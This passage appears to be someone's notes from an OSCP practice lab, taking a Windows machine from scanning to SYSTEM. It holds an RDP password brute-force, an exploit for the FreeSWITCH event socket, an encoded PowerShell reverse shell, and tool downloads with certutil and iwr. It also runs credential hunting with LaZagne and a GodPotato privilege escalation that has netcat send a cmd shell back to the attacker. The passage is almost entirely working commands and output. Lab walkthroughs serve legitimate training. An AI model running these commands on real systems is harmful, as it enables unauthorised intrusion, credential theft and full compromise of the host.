+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-04-07T16:58:32
+| Not valid after:  2024-10-07T16:58:32
+| MD5:   80f2:b974:bbf1:e055:2d2c:5780:171b:00b3
+| SHA-1: 2734:a03b:9b03:8123:0323:5b49:9df8:57c1:f9fd:a641
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: OSCP
+|   DNS_Computer_Name: OSCP
+|   Product_Version: 10.0.19041
+|_  System_Time: 2024-05-08T04:58:46+00:00
+
+FreeSWITCH: 8021
+8021/tcp open  freeswitch-event syn-ack FreeSWITCH mod_event_socket
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+
+				NMAP: UDP
+sudo nmap -sU -O 192.168.154.151
+All 1000 scanned ports on 192.168.154.151 are in ignored states.
+
+
+				RDP: 3389
+┌──(kali㉿kali)-[~]
+└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt -V rdp://192.168.154.151
+
+
+				HTTP: 80
+http://192.168.154.151/
+Microsoft IIS httpd 10.0
+
+
+			FOOTHOLD: FreeSWITCH: 8021
+CVE-2019-19492: https://github.com/tucommenceapousser/CVE-2019-19492
+python exploit.py [--target IP] [--auto] [--output FILE]
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit freeswitch               
+FreeSWITCH - Event Socket Command Execution (Metasploit)       | multiple/remote/47698.rb
+FreeSWITCH 1.10.1 - Command Execution                          | windows/remote/47799.txt
+
+# 47799:
+https://www.exploit-db.com/exploits/47799
+
+┌──(kali㉿kali)-[~/Desktop/B/151]
+└─$ chmod +x 47799.py  
+
+# -- Example --
+# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
+# Authenticated
+# Content-Type: api/response
+# Content-Length: 20
+
+┌──(kali㉿kali)-[~/Desktop/B/151]
+└─$ sudo ./47799.py 192.168.154.151 whoami
+: not found 20: 
+: not found 22: 
+./47799.py: 23: from: not found
+: not found 25: 
+./47799.py: 26: Syntax error: word unexpected (expecting ")")
+
+┌──(kali㉿kali)-[~/Desktop/B/151]
+└─$ sudo python 47799.py 192.168.154.151 whoami 
+Authenticated
+Content-Type: api/response
+Content-Length: 11
+
+oscp\chris
+
+https://www.revshells.com/
+
+┌──(kali㉿kali)-[~/Desktop/B/151]
+└─$ sudo python 47799.py 192.168.154.151 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAwACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
+Authenticated
+Content-Type: api/response
+Content-Length: 14
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 80                    
+listening on [any] 80 ...
+connect to [192.168.45.180] from (UNKNOWN) [192.168.154.151] 60104
+
+PS C:\Program Files\FreeSWITCH> whoami
+oscp\chris
+
+PS C:\Program Files\FreeSWITCH> hostname
+OSCP
+
+PS C:\Program Files\FreeSWITCH> systeminfo
+Host Name:                 OSCP
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19043 N/A Build 19043
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          chris
+Registered Organization:   
+Product ID:                00331-10000-00001-AA215
+Original Install Date:     10/31/2022, 12:36:15 PM
+System Boot Time:          4/8/2024, 9:58:24 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+
+
+				NETWORK: 
+PS C:\Program Files\FreeSWITCH> ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : OSCP
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-31-58
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.154.151(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.154.254
+   DNS Servers . . . . . . . . . . . : 192.168.154.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+
+				CREDS:
+# Powershell password hunting:
+PS C:\Program Files\FreeSWITCH> (Get-PSReadlineOption).HistorySavePath
+C:\Users\chris\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Program Files\FreeSWITCH> type C:\Users\chris\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+rename-computer -newname 'OSCP'
+
+# LaZagne: 
+PS C:\Users\chris\Desktop> PS C:\Users\chris\Desktop> iwr -uri http://192.168.45.180:80/LaZagne.exe -Outfile laz.exe
+.\laz.exe all
+[+] 0 passwords have been found.
+
+
+				Files of interest: 
+PS C:\Program Files\FreeSWITCH> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
+    Directory: C:\Users\chris\Desktop
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          5/7/2024   9:43 PM             34 local.txt 
+
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
+
+
+PS C:\Users\chris\Desktop> cat local.txt
+b4f74cebd44c6375c85a16901021dd04
+
+
+				PRIV ESC: proof.txt
+
+PS C:\Program Files\FreeSWITCH> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+┌──(kali㉿kali)-[~/Desktop/WINDOWS-PRIV]
+└─$ python3 -m http.server 80  
+
+# PrintSpoofer64: 
+PS C:\Users\chris\Desktop> iwr -uri http://192.168.45.180:80/PrintSpoofer64.exe -Outfile print.exe
+PS C:\Users\chris\Desktop> .\print.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[-] Operation failed or timed out.
+
+# GodPotato: 
+PS C:\Users\chris\Desktop> certutil.exe -urlcache -split -f "http://192.168.45.180/GodPotato-NET4.exe" GodPotato.exe
+PS C:\Users\chris\Desktop> certutil.exe -urlcache -split -f "http://192.168.45.180/nc64.exe" nc64.exe
+PS C:\Users\chris\Desktop> .\GodPotato.exe -cmd "C:\Users\chris\Desktop\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.180 2560"
+[*] CombaseModule: 0x140714928242688
+[*] DispatchTable: 0x140714930693560
+[*] UseProtseqFunction: 0x140714930025584
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\f6992a99-94a7-4167-91b0-c255c48c5d5f\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000f402-0aa8-ffff-90df-d203b80c6630
+[*] DCOM obj OXID: 0xa0a3860d35c676cc
+[*] DCOM obj OID: 0x4ad0e90d58a7763d
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 992 Token:0x784  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4328
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 2560                                                                        
+listening on [any] 2560 ...
+connect to [192.168.45.180] from (UNKNOWN) [192.168.154.151] 60276
+
+C:\Windows\system32> whoami
+whoami
+
+C:\Windows\system32> powershell -ep bypass
+powershell -ep bypass
+
+C:\Windows\system32> cd C:\Users\Administrator
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 949E-5CA2
+ Directory of C:\Users\Administrator\Desktop
+11/04/2022  07:48 AM    <DIR>          .
+11/04/2022  07:48 AM    <DIR>          ..
+05/07/2024  09:42 PM                34 proof.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  15,195,856,896 bytes free
+
+C:\Users\Administrator\Desktop> type proof.txt
+6afeb7efc509715cb8ea606a70b9ed01
+
+
+--------------------------------------------------------------------------------------------------
+
